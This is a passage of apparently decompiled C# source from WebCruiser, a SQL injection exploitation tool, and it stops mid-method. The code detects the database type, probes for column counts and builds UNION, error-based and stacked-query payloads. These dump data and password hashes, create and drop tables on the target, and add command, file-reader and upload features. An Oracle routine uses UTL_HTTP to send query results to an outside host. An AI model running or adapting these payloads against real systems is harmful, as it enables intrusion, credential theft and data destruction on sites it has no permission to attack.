using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using System.Xml;

namespace WebCruiserWVS;

public class FormSQL : Form
{
	private delegate string Delegate9();

	private delegate void Delegate10(string string_0);

	private delegate void Delegate11(ListView listView_0);

	private delegate void Delegate12(TabPage tabPage_0);

	private delegate void Delegate13(TabPage tabPage_0);

	private delegate string Delegate14(string string_0);

	private delegate int Delegate15(string string_0);

	private delegate bool Delegate16(string string_0);

	private delegate int Delegate17(ListView listView_0);

	private delegate bool Delegate18(int int_0);

	private delegate string Delegate19(int int_0);

	public struct GStruct1
	{
		public TextBox textBox_0;

		public string string_0;
	}

	private delegate void Delegate20(GStruct1 gstruct1_0);

	[CompilerGenerated]
	private sealed class Class0
	{
		public string string_0;

		public string string_1;

		public int int_0;

		public Thread thread_0;

		public FormSQL formSQL_0;

		public void method_0()
		{
			for (int i = 0; i < int_0; i++)
			{
				string text = formSQL_0.method_28("select%20top%201", "isnull(tmp,char(32))", "from " + string_0 + " where id=" + (i + 1), 255, 255, bool_1: false);
				text = text.Replace("&lt;", "<").Replace("&gt;", ">");
				formSQL_0.method_95(text);
			}
		}

		public void method_1()
		{
			thread_0.Join();
			string_1 = formSQL_0.string_0 + formSQL_0.string_1 + ";drop table " + string_0 + "%3B%2D%2D";
			formSQL_0.formMain_0.gclass0_0.method_30(string_1, formSQL_0.formMain_0.method_0());
			formSQL_0.formMain_0.method_11("Done");
		}
	}

	private FormMain formMain_0;

	private bool bool_0;

	private string string_0 = "";

	private string string_1 = "";

	private string string_2 = "";

	private string string_3 = "";

	private int int_0;

	private string string_4 = "1";

	private string string_5 = "";

	private string string_6 = "";

	private string string_7 = "";

	private IContainer icontainer_0;

	private TabControl tabSQLInjection;

	private TabPage tabEnv;

	private TabPage tabDatabase;

	private TabPage tabCMD;

	private TabPage tabFileReader;

	private ToolStrip toolStripSQL;

	private ToolStripLabel toolStripLabel1;

	private ToolStripTextBox txtKeyWord;

	private ToolStripComboBox cmbDBTypeList;

	private ToolStripSeparator toolStripSeparator1;

	private ToolStripLabel toolStripLabel2;

	private ToolStripSeparator toolStripSeparator2;

	private ToolStripLabel toolStripLabel3;

	private ToolStripComboBox cmbInjectionType;

	private ToolStripSeparator toolStripSeparator3;

	private SplitContainer splitDB;

	private ToolStrip toolStripDB;

	private ToolStrip toolStripData;

	private ListView listViewData;

	private ToolStripButton btnGetDB;

	private ToolStripSeparator toolStripSeparator4;

	private ToolStripButton btnGetTable;

	private ToolStripSeparator toolStripSeparator5;

	private ToolStripButton btnGetColumn;

	private ToolStripSeparator toolStripSeparator6;

	private ToolStripLabel toolStripLabel4;

	private ToolStripTextBox txtRowsBegin;

	private ToolStripLabel toolStripLabel5;

	private ToolStripTextBox txtRowsEnd;

	private ToolStripButton btnGetData;

	private ToolStripSeparator toolStripSeparator7;

	private ToolStripComboBox cmbChkAllDB;

	private ToolStripSeparator toolStripSeparator8;

	private ToolStrip toolFileReader;

	private ToolStripLabel toolStripLabel6;

	private ToolStripTextBox txtFileName;

	private ToolStripButton btnReadFile;

	private ToolStripSeparator toolStripSeparator10;

	private TextBox txtFileContent;

	private ToolStrip toolStripCommand;

	private ToolStripTextBox txtCMD;

	private ToolStripButton btnCMD;

	private ToolStrip toolStripDBCMD;

	private ToolStripTextBox txtDBCMD;

	private ToolStripButton btnDBCMD;

	private ListBox listBoxCMD;

	private ToolStrip toolStripEnv;

	private ToolStripButton btnGetInfo;

	private ToolStripSeparator toolStripSeparator11;

	private ListView listViewEnv;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private ToolStripSeparator toolStripSeparator12;

	private ToolStripSeparator toolStripSeparator15;

	private ToolStripSeparator toolStripSeparator16;

	private ToolStripSeparator toolStripSeparator13;

	private ToolStripSeparator toolStripSeparator14;

	private TabPage tabDebug;

	private GroupBox grpBlindType;

	private Label label15;

	private Label label14;

	private Label label13;

	private Label label12;

	private Label label11;

	private Label label10;

	private TextBox txtWildField;

	private Label label9;

	private Button btnSetEnv;

	private Button btnGetEnv;

	private Label label8;

	private TextBox txtInjectField;

	private Label label7;

	private TextBox txtFieldNum;

	private RadioButton radioBlind;

	private RadioButton radioFieldEcho;

	private RadioButton radioPlainText;

	private ImageList imageList_0;

	private ToolStripSeparator toolStripSeparator9;

	private ToolStripButton btnImpDB;

	private ToolStripSeparator toolStripSeparator17;

	private ToolStripButton btnExpDB;

	private ToolStripButton btnExpData;

	private ToolStripSeparator toolStripSeparator18;

	private ToolStripSeparator toolStripSeparator19;

	private RadioButton radioCrossSite;

	private Label label1;

	private TabPage tabFileUploader;

	private Button btnSelectFile;

	private Button btnFileUpload;

	private TextBox txtUploadFile;

	private Label label2;

	private Label label3;

	private TextBox txtTargetFileName;

	private Label label4;

	private Button btnGetWebRoot;

	private TreeView treeViewDB;

	private TabPage tabEscapeString;

	private TextBox txtSourceString;

	private Label label6;

	private Label label5;

	private Button btnEncode;

	private TextBox txtEscapeString;

	private Label label16;

	private Label label17;

	private Label lblComment;

	private Label label18;

	private TextBox txtComment;

	private Label label19;

	private ComboBox ComboBoxDBEncoding;

	private Label label21;

	private Label label22;

	private ComboBox ComboBoxWebEncoding;

	private Label label20;

	private ToolStripButton ButtonResetSQL;

	private ToolStripSeparator toolStripSeparator20;

	public FormSQL(FormMain formMain_1)
	{
		InitializeComponent();
		formMain_0 = formMain_1;
		cmbDBTypeList.set_SelectedIndex(0);
		cmbInjectionType.set_SelectedIndex(0);
		string_0 = formMain_0.method_2();
		cmbChkAllDB.set_SelectedIndex(0);
		((Control)toolStripEnv).set_Visible(true);
		((Control)toolStripDB).set_Visible(true);
		((Control)toolStripData).set_Visible(true);
	}

	private void method_0()
	{
		if (formMain_0.method_0() == GEnum0.GET)
		{
			string_0 = formMain_0.method_2();
		}
		else
		{
			string_0 = formMain_0.method_2() + "^" + formMain_0.method_4();
		}
	}

	private string method_1()
	{
		if (!((Control)toolStripSQL).get_InvokeRequired())
		{
			return ((ToolStripItem)txtKeyWord).get_Text().Trim();
		}
		Delegate9 @delegate = method_1;
		return (string)((Control)this).Invoke((Delegate)@delegate, new object[0]);
	}

	private void method_2(string string_8)
	{
		if (!((Control)toolStripSQL).get_InvokeRequired())
		{
			cmbDBTypeList.set_SelectedIndex(cmbDBTypeList.FindString(string_8));
			return;
		}
		Delegate10 @delegate = method_2;
		((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
	}

	private void method_3(string string_8)
	{
		if (!((Control)toolStripSQL).get_InvokeRequired())
		{
			cmbInjectionType.set_SelectedIndex(cmbInjectionType.FindString(string_8));
			return;
		}
		Delegate10 @delegate = method_3;
		((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
	}

	public void method_4(GEnum2 genum2_0)
	{
		switch (genum2_0)
		{
		case GEnum2.Integer:
			method_3("Integer");
			string_1 = "";
			string_2 = "";
			break;
		case GEnum2.String:
			method_3("String");
			string_1 = "%27";
			string_2 = "%20and%20%271%27=%271";
			break;
		case GEnum2.Search:
			method_3("Search");
			string_1 = "%25%27";
			string_2 = "%20and%20%27%25%27%3D%27";
			break;
		default:
			method_3("UnKnown");
			string_1 = "";
			string_2 = "";
			break;
		}
	}

	public void method_5(string string_8)
	{
		if (!((Control)toolStripSQL).get_InvokeRequired())
		{
			((ToolStripItem)txtKeyWord).set_Text(string_8);
			((Control)toolStripSQL).Refresh();
		}
		else
		{
			Delegate10 @delegate = method_5;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
	}

	private string method_6(string string_8)
	{
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0277: Unknown result type (might be due to invalid IL or missing references)
		//IL_03dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fe: Unknown result type (might be due to invalid IL or missing references)
		string text = method_1();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		formMain_0.method_11("Getting KeyWord...");
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			string[] array = formMain_0.gclass0_0.method_35(string_8, formMain_0.method_0(), "");
			string[] array2 = array;
			foreach (string text6 in array2)
			{
				formMain_0.method_10(text6);
			}
			string[] array3 = array;
			int num = 0;
			string[] array4;
			string text8;
			while (true)
			{
				if (num < array3.Length)
				{
					string text7 = array3[num];
					string[] separator = new string[1] { "^^" };
					array4 = text7.Split(separator, StringSplitOptions.None);
					text8 = array4[4];
					if (text8.IndexOf("XPath") < 0)
					{
						break;
					}
					num++;
					continue;
				}
				MessageBox.Show("Get KeyWord Failed!    Possible Reasons:\r\n* Current URL is not injectable!\r\n* Special Characters is Filtered, try to modify the advanced settings.\r\n* Injection Type Error, sometimes it need single quotes even the parameter is a Integer.\r\n", "Information", (MessageBoxButtons)0, (MessageBoxIcon)16);
				formMain_0.gclass0_0.method_4("");
				return formMain_0.gclass0_0.method_3();
			}
			if (text8.IndexOf("URL") >= 0)
			{
				string_0 = array4[0];
				formMain_0.method_1(GEnum0.GET);
			}
			else
			{
				string[] array5 = GClass0.smethod_1(array4[0], '^');
				string_0 = array5[0];
				formMain_0.method_17(array5[1]);
				if (text8.IndexOf("POST") >= 0)
				{
					formMain_0.method_1(GEnum0.POST);
				}
				else if (text8.IndexOf("COOKIE") >= 0)
				{
					formMain_0.method_1(GEnum0.COOKIE);
				}
			}
			formMain_0.method_19(formMain_0.method_0());
			formMain_0.method_16(string_0);
			string value = array4[2];
			formMain_0.gclass0_0.method_19((GEnum2)Enum.Parse(typeof(GEnum2), value));
			method_4(formMain_0.gclass0_0.method_18());
			formMain_0.gclass0_0.method_4(array4[3]);
			method_5(formMain_0.gclass0_0.method_3());
			return formMain_0.gclass0_0.method_3();
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.NotInjectable)
		{
			MessageBox.Show("Current URL is not injectable !", "Information");
			formMain_0.gclass0_0.method_4("");
			return formMain_0.gclass0_0.method_3();
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.Integer)
		{
			text2 = string_0 + "%20and%207=7";
			text3 = string_0 + "%20and%207=2";
		}
		else if (formMain_0.gclass0_0.method_18() == GEnum2.String)
		{
			text2 = string_0 + string_1 + "%20and%20%277%27=%277";
			text3 = string_0 + string_1 + "%20and%20%277%27=%272";
		}
		else if (formMain_0.gclass0_0.method_18() == GEnum2.Search)
		{
			text2 = string_0 + string_1 + "%20and%201%3D1%20and%20%27%25%27%3D%27";
			text3 = string_0 + string_1 + "%20and%201%3D2%20and%20%27%25%27%3D%27";
		}
		text4 = formMain_0.gclass0_0.method_30(text2, formMain_0.method_0());
		text5 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
		formMain_0.gclass0_0.method_4(GClass0.smethod_5(text4, text5, ""));
		if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
		{
			MessageBox.Show("Get KeyWord Failed!    Possible Reasons:\r\n* Current URL is not injectable!\r\n* Special Characters is Filtered, try to modify the advanced settings.\r\n* Injection Type Error, sometimes it need single quotes even the parameter is a Integer.\r\n", "Information", (MessageBoxButtons)0, (MessageBoxIcon)16);
			if (formMain_0.gclass0_0.method_18() == GEnum2.Integer)
			{
				MessageBox.Show("Please select the Injection Type: \"String\", and Retry!", "Information");
			}
			formMain_0.method_11("Done");
		}
		method_5(formMain_0.gclass0_0.method_3());
		return formMain_0.gclass0_0.method_3();
	}

	private void method_7(ListView listView_0)
	{
		if (!((Control)listView_0).get_InvokeRequired())
		{
			listView_0.get_Items().Clear();
			return;
		}
		Delegate11 @delegate = method_7;
		((Control)this).Invoke((Delegate)@delegate, new object[1] { listView_0 });
	}

	private void method_8(TabPage tabPage_0)
	{
		if (!((Control)tabSQLInjection).get_InvokeRequired())
		{
			if (tabSQLInjection.get_TabPages().Contains(tabPage_0))
			{
				tabSQLInjection.get_TabPages().Remove(tabPage_0);
			}
		}
		else
		{
			Delegate12 @delegate = method_8;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { tabPage_0 });
		}
	}

	private void method_9(TabPage tabPage_0)
	{
		if (!((Control)tabSQLInjection).get_InvokeRequired())
		{
			if (!tabSQLInjection.get_TabPages().Contains(tabPage_0))
			{
				TabPage[] array = (TabPage[])(object)new TabPage[1] { tabPage_0 };
				tabSQLInjection.get_TabPages().AddRange(array);
			}
		}
		else
		{
			Delegate13 @delegate = method_9;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { tabPage_0 });
		}
	}

	private void method_10(string string_8)
	{
		if (!((Control)listViewEnv).get_InvokeRequired())
		{
			listViewEnv.get_Items().Add(string_8);
			((Control)listViewEnv).Refresh();
		}
		else
		{
			Delegate10 @delegate = method_10;
			((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
		}
	}

	private void method_11(string string_8)
	{
		if (!string.IsNullOrEmpty(string_8))
		{
			if (!((Control)treeViewDB).get_InvokeRequired())
			{
				TreeNode val = treeViewDB.get_Nodes().Add(string_8);
				val.set_ImageKey("db.png");
				treeViewDB.ExpandAll();
				((Control)treeViewDB).Refresh();
			}
			else
			{
				Delegate10 @delegate = method_11;
				((Control)this).Invoke((Delegate)@delegate, new object[1] { string_8 });
			}
		}
	}

	private void method_12(bool bool_1)
	{
		method_7(listViewEnv);
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			method_9(tabCMD);
			method_9(tabFileUploader);
			method_8(tabFileReader);
			if (!bool_1)
			{
				method_10("Version");
				method_10("Server");
				method_10("WWWRoot");
				method_10("user");
				method_10("IsAdmin");
				method_10("Database");
				method_10("Sa_PasswordHash");
			}
			string_3 = "%2D%2D";
			string_4 = "1";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			method_8(tabCMD);
			method_8(tabFileUploader);
			method_9(tabFileReader);
			if (!bool_1)
			{
				method_10("Version");
				method_10("Server");
				method_10("OS");
				method_10("user");
				method_10("Database");
				method_10("root_PasswordHash");
			}
			string_3 = "%23";
			string_4 = "1";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			method_8(tabCMD);
			method_8(tabFileUploader);
			method_8(tabFileReader);
			if (!bool_1)
			{
				method_10("user");
				method_10("Server");
				method_10("Version");
				method_10("instance_name");
				method_10("SYS_PasswordHash");
				method_10("user_PasswordHash");
			}
			string_3 = "%2D%2D";
			string_4 = "1";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			method_8(tabCMD);
			method_8(tabFileUploader);
			method_8(tabFileReader);
			if (!bool_1)
			{
				method_10("Server");
				treeViewDB.get_Nodes().Clear();
				method_11("Access");
			}
			string_3 = "%00";
			string_4 = "1";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			method_8(tabCMD);
			method_8(tabFileUploader);
			method_8(tabFileReader);
			method_10("Version");
			method_10("Server");
			method_10("user");
			method_10("Database");
			string_3 = "%2D%2D";
			string_4 = "chr(97)";
		}
		else
		{
			method_8(tabCMD);
			method_8(tabFileUploader);
			method_8(tabFileReader);
			string_3 = "%2D%2D";
		}
	}

	private GEnum1 method_13(string string_8)
	{
		//IL_0468: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			formMain_0.method_11("Getting DataBase Type...");
			string text = string_8 + "%27";
			formMain_0.gclass0_0.method_30(string_8, formMain_0.method_0());
			HttpWebResponse httpWebResponse = formMain_0.gclass0_0.method_28(text, formMain_0.method_0());
			string text2 = formMain_0.gclass0_0.method_29(httpWebResponse);
			if (httpWebResponse.StatusCode == HttpStatusCode.InternalServerError)
			{
				if (text2.IndexOf("SQL Server") >= 0)
				{
					formMain_0.gclass0_0.method_17(GEnum1.SQLServer);
					method_2("SQLserver");
					method_12(bool_1: false);
					formMain_0.gclass0_0.method_21(GEnum3.PlainText);
					return GEnum1.SQLServer;
				}
				if (text2.IndexOf("JET Database") >= 0 || text2.IndexOf("Access Driver") >= 0)
				{
					formMain_0.gclass0_0.method_17(GEnum1.Access);
					method_2("Access");
					method_12(bool_1: false);
					return GEnum1.Access;
				}
				if (text2.IndexOf("MySQL") >= 0 || text2.IndexOf("mysql") >= 0)
				{
					formMain_0.gclass0_0.method_17(GEnum1.MySQL);
					method_2("MySQL");
					method_12(bool_1: false);
					return GEnum1.MySQL;
				}
				if (text2.IndexOf("Ora") >= 0)
				{
					formMain_0.gclass0_0.method_17(GEnum1.Oracle);
					method_2("Oracle");
					method_12(bool_1: false);
					return GEnum1.Oracle;
				}
				if (text2.IndexOf("db2") >= 0)
				{
					formMain_0.gclass0_0.method_17(GEnum1.DB2);
					method_2("DB2");
					method_12(bool_1: false);
					return GEnum1.DB2;
				}
			}
			formMain_0.gclass0_0.method_4(method_6(string_8));
			if (string.IsNullOrEmpty(formMain_0.gclass0_0.method_3()))
			{
				return GEnum1.UnKnown;
			}
			string text3 = string_8 + string_1 + "%20and%20(select%20count(1)%20from%20sysobjects)>0" + string_2;
			text2 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				formMain_0.gclass0_0.method_17(GEnum1.SQLServer);
				method_2("SQLserver");
				method_12(bool_1: false);
				return GEnum1.SQLServer;
			}
			text3 = string_8 + string_1 + "%20and%20(select%20length(user()))>0" + string_2;
			text2 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				formMain_0.gclass0_0.method_17(GEnum1.MySQL);
				method_2("MySQL");
				method_12(bool_1: false);
				return GEnum1.MySQL;
			}
			text3 = string_8 + string_1 + "%20and%20(select%20length(user)%20from%20dual)>0" + string_2;
			text2 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				formMain_0.gclass0_0.method_17(GEnum1.Oracle);
				method_2("Oracle");
				method_12(bool_1: false);
				return GEnum1.Oracle;
			}
			text3 = string_8 + string_1 + "%20and%20(select%20length(user)%20from%20sysibm.sysdummy1)>0" + string_2;
			text2 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				formMain_0.gclass0_0.method_17(GEnum1.DB2);
				method_2("DB2");
				method_12(bool_1: false);
				return GEnum1.DB2;
			}
			text3 = string_8 + string_1 + "%20and%20asc(chr(97))=97" + string_2;
			text2 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			if (text2.IndexOf(formMain_0.gclass0_0.method_3()) >= 0)
			{
				formMain_0.gclass0_0.method_17(GEnum1.Access);
				method_2("Access");
				method_12(bool_1: false);
				return GEnum1.Access;
			}
			MessageBox.Show("* Get Database Type Failed! \r\n* Please Select the DB Type manually!", "Information");
			return GEnum1.UnKnown;
		}
		catch
		{
			return GEnum1.UnKnown;
		}
	}

	private string method_14(string string_8)
	{
		while (formMain_0.gclass0_0.method_12() > 1)
		{
			Thread.Sleep(500);
		}
		string text = string_0 + string_1 + "%20and%20(char(33)%2Bchar(83)%2Bchar(33)%2B(" + string_8 + ")%2Bchar(33)%2Bchar(69)%2Bchar(33))>0" + string_2;
		Regex regex = new Regex("(?<=(!S!))[.\\s\\S]*?(?=(!E!))", RegexOptions.Multiline | RegexOptions.Singleline);
		int num = 0;
		string value;
		while (true)
		{
			if (num < 3)
			{
				string input = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
				value = regex.Match(input).Value;
				if (!string.IsNullOrEmpty(value))
				{
					break;
				}
				num++;
				continue;
			}
			return "";
		}
		return value;
	}

	private string method_15(string string_8, string string_9, string string_10, bool bool_1)
	{
		while (formMain_0.gclass0_0.method_12() > 1)
		{
			Thread.Sleep(500);
		}
		string text = "";
		string text2 = "";
		for (int i = 0; i < formMain_0.gclass0_0.int_3 - 1; i++)
		{
			text = ((!string.IsNullOrEmpty(text)) ? (text + "," + string_4) : ((formMain_0.gclass0_0.method_16() != GEnum1.DB2) ? string_4 : "1"));
		}
		if (!string.IsNullOrEmpty(text))
		{
			text += ",";
		}
		for (int j = 0; j < formMain_0.gclass0_0.int_4 - formMain_0.gclass0_0.int_3; j++)
		{
			text2 = text2 + "," + string_4;
		}
		string text3 = "";
		string text4 = "";
		if (bool_1)
		{
			int_0++;
			string text5 = "WCRTEMP" + $"{int_0:D5}";
			text3 = string_0 + string_1 + ";create table " + text5 + "(tmp varchar(255));insert into " + text5 + "%20" + string_8 + "%20" + string_9 + "%20" + string_10 + "%3B" + string_3;
			formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			text4 = method_15("select%20top%201%20", "tmp", "from%20" + text5, bool_1: false);
			text3 = string_0 + string_1 + ";drop table " + text5 + "%3B" + string_3;
			formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
			formMain_0.method_11("Get Item: " + text4);
			return text4;
		}
		string text6 = "";
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
		{
			text6 = "char(33)%2Bchar(83)%2Bchar(33)%2B(" + string_9 + ")%2Bchar(33)%2Bchar(69)%2Bchar(33)";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
		{
			text6 = "concat(char(33,83,33)," + string_9 + ",char(33,69,33))";
		}
		else if (formMain_0.gclass0_0.method_16() != GEnum1.Oracle && formMain_0.gclass0_0.method_16() != GEnum1.DB2)
		{
			if (formMain_0.gclass0_0.method_16() != GEnum1.Access)
			{
				return "";
			}
			text6 = "chr(33)%2Bchr(83)%2Bchr(33)%2B(" + string_9 + ")%2Bchr(33)%2Bchr(69)%2Bchr(33)";
		}
		else
		{
			text6 = "chr(33)||chr(83)||chr(33)||" + string_9 + "||chr(33)||chr(69)||chr(33)";
		}
		text3 = string_0 + string_1 + "%20and%201=2%20union%20all%20" + string_8 + "%20" + text + text6 + text2 + "%20" + string_10 + string_3;
		Regex regex = new Regex("(?<=(!S!))[.\\s\\S]*?(?=(!E!))", RegexOptions.Multiline | RegexOptions.Singleline);
		int num = 0;
		while (true)
		{
			if (num < 3)
			{
				string input = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
				text4 = regex.Match(input).Value;
				formMain_0.method_11("Get Item: " + text4);
				if (!string.IsNullOrEmpty(text4))
				{
					break;
				}
				num++;
				continue;
			}
			return "";
		}
		return text4;
	}

	private string method_16(string string_8, string string_9, string string_10)
	{
		while (formMain_0.gclass0_0.method_12() > 0)
		{
			Thread.Sleep(500);
		}
		string text = string_0 + string_1 + "%20and%20UTL_HTTP.request(" + method_37(WCRSetting.string_0) + "||(" + string_8 + "%20" + string_9 + "%20" + string_10 + "))=1" + string_3;
		formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
		string text2 = formMain_0.gclass0_0.method_31(WCRSetting.string_1, GEnum0.GET, Encoding.UTF8);
		formMain_0.method_11("Getting Item: " + text2 + " - By CrossSite Injection.");
		return text2;
	}

	private string method_17(string string_8)
	{
		Regex regex = new Regex("(?<=(!S!))[.\\s\\S]*?(?=(!E!))", RegexOptions.Multiline | RegexOptions.Singleline);
		return regex.Match(string_8).Value;
	}

	private GEnum2 method_18()
	{
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		method_0();
		if (string_0.LastIndexOf('=') < 0)
		{
			formMain_0.gclass0_0.method_19(GEnum2.NotInjectable);
			if (formMain_0.method_0() == GEnum0.GET)
			{
				MessageBox.Show("* It's not injectable! Please check the URL format and Request Type: GET/POST/COOKIE!\r\n* Example: http://127.0.0.1/view.jsp?user=admin\r\n* If it exists search forms in current page, please input % or other mainfrm.CurrentSite.CurrentKeyWord and submit it! Then Check the radiobutton \"Search\" and Retry!", "Infomation");
			}
		}
		else if (Regex.IsMatch(string_0.Substring(string_0.LastIndexOf('=') + 1), "^\\d+$"))
		{
			formMain_0.gclass0_0.method_19(GEnum2.Integer);
			method_4(formMain_0.gclass0_0.method_18());
		}
		else
		{
			formMain_0.gclass0_0.method_19(GEnum2.String);
			method_4(formMain_0.gclass0_0.method_18());
		}
		return formMain_0.gclass0_0.method_18();
	}

	private int method_19(string string_8)
	{
		formMain_0.method_11("Getting Field Number in Current SQL ...");
		int num = -1;
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			formMain_0.gclass0_0.method_19(method_18());
		}
		if (formMain_0.gclass0_0.method_18() == GEnum2.UnKnown)
		{
			return -1;
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.UnKnown)
		{
			formMain_0.gclass0_0.method_17(method_13(string_8));
		}
		string text = "";
		bool flag = true;
		if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
		{
			text = "%20from%20dual";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
		{
			text = "%20from%20sysibm.sysdummy1";
		}
		else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			if (string_5.Equals("NULL"))
			{
				flag = false;
			}
			else
			{
				text = "%20from%20" + string_5;
			}
		}
		string text2 = "";
		string text3 = "";
		string text4 = formMain_0.gclass0_0.method_30(string_8, formMain_0.method_0());
		string text5 = "";
		string text6 = "";
		if (flag)
		{
			for (int i = 0; i < 100; i++)
			{
				if (!string.IsNullOrEmpty(text2))
				{
					text2 = ((formMain_0.gclass0_0.method_16() != GEnum1.DB2) ? (text2 + ",NULL") : (text2 + ",chr(97)"));
				}
				else
				{
					text2 = "NULL";
					if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
					{
						text2 = "1";
					}
				}
				text3 = string_8 + string_1 + "%20union%20all%20select " + text2 + text + string_3;
				text5 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
				text6 = GClass0.smethod_5(text4, text5, "");
				if (string.IsNullOrEmpty(text6))
				{
					return i + 1;
				}
			}
		}
		if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer || formMain_0.gclass0_0.method_16() == GEnum1.Oracle || formMain_0.gclass0_0.method_16() == GEnum1.Access)
		{
			for (int j = 2; j < 128; j++)
			{
				text3 = string_8 + string_1 + "%20order%20by%20" + j + string_3;
				text5 = formMain_0.gclass0_0.method_30(text3, formMain_0.method_0());
				text6 = GClass0.smethod_5(text4, text5, "");
				if (!string.IsNullOrEmpty(text6))
				{
					return j - 1;
				}
			}
		}
		return -1;
	}

	private int method_20(int int_1)
	{
		formMain_0.method_11("Getting Injectale Field Location in Current SQL ...");
		int num = 0;
		while (true)
		{
			if (num < int_1)
			{
				string text = "";
				string text2 = "";
				for (int i = 0; i < num; i++)
				{
					if (string.IsNullOrEmpty(text))
					{
						text = string_4;
						if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
						{
							text = "1";
						}
					}
					else
					{
						text = text + "," + string_4;
					}
				}
				if (!string.IsNullOrEmpty(text))
				{
					text += ",";
				}
				for (int j = 0; j < int_1 - num - 1; j++)
				{
					text2 = text2 + "," + string_4;
				}
				string text3 = "";
				if (formMain_0.gclass0_0.method_16() == GEnum1.SQLServer)
				{
					text3 = "char(33)%2Bchar(83)%2Bchar(33)%2Bchar(87)%2Bchar(87)%2Bchar(87)%2Bchar(67)%2Bchar(67)%2Bchar(67)%2Bchar(82)%2Bchar(82)%2Bchar(82)%2Bchar(49)%2Bchar(46)%2Bchar(48)%2Bchar(33)%2Bchar(69)%2Bchar(33)";
				}
				else if (formMain_0.gclass0_0.method_16() == GEnum1.MySQL)
				{
					text3 = "char(33,83,33,87,87,87,67,67,67,82,82,82,49,46,48,33,69,33)";
				}
				else if (formMain_0.gclass0_0.method_16() != GEnum1.Oracle && formMain_0.gclass0_0.method_16() != GEnum1.DB2)
				{
					if (formMain_0.gclass0_0.method_16() != GEnum1.Access)
					{
						return -1;
					}
					text3 = "chr(33)%2Bchr(83)%2Bchr(33)%2Bchr(87)%2Bchr(87)%2Bchr(87)%2Bchr(67)%2Bchr(67)%2Bchr(67)%2Bchr(82)%2Bchr(82)%2Bchr(82)%2Bchr(49)%2Bchr(46)%2Bchr(48)%2Bchr(33)%2Bchr(69)%2Bchr(33)";
				}
				else
				{
					text3 = "chr(33)||chr(83)||chr(33)||chr(87)||chr(87)||chr(87)||chr(67)||chr(67)||chr(67)||chr(82)||chr(82)||chr(82)||chr(49)||chr(46)||chr(48)||chr(33)||chr(69)||chr(33)";
				}
				string text4 = "";
				if (formMain_0.gclass0_0.method_16() == GEnum1.Oracle)
				{
					text4 = "%20from dual";
				}
				else if (formMain_0.gclass0_0.method_16() == GEnum1.DB2)
				{
					text4 = "%20from sysibm.sysdummy1";
				}
				else if (formMain_0.gclass0_0.method_16() == GEnum1.Access)
				{
					if (string_5.Equals("NULL"))
					{
						return -1;
					}
					text4 = "%20from%20" + string_5 + "%00";
				}
				string text5 = string_0 + string_1 + "%20and%201=2%20union%20all%20select%20" + text + text3 + text2 + text4 + string_3;
				string text6 = formMain_0.gclass0_0.method_30(text5, formMain_0.method_0());
				if (!string.IsNullOrEmpty(text6))
				{
					if (text6.IndexOf("!S!WWWCCCRRR1.0!E!") >= 0)
					{
						break;
					}
					num++;
					continue;
				}
				return -1;
			}
			return -1;
		}
		return num + 1;
	}

	private string method_21(string string_8)
	{
		while (formMain_0.gclass0_0.method_12() > 1)
		{
			Thread.Sleep(500);
		}
		string text = string_0 + string_1 + "||utl_inaddr.get_host_name((chr(33)||chr(83)||chr(33)||(" + string_8 + ")||chr(33)||chr(69)||chr(33)))" + string_3;
		string input = formMain_0.gclass0_0.method_30(text, formMain_0.method_0());
		Regex regex = new Regex("(?<=(!S!))[.\\s\\S]*?(?=(!E!))", RegexOptions.Multiline | RegexOptions.Singleline);
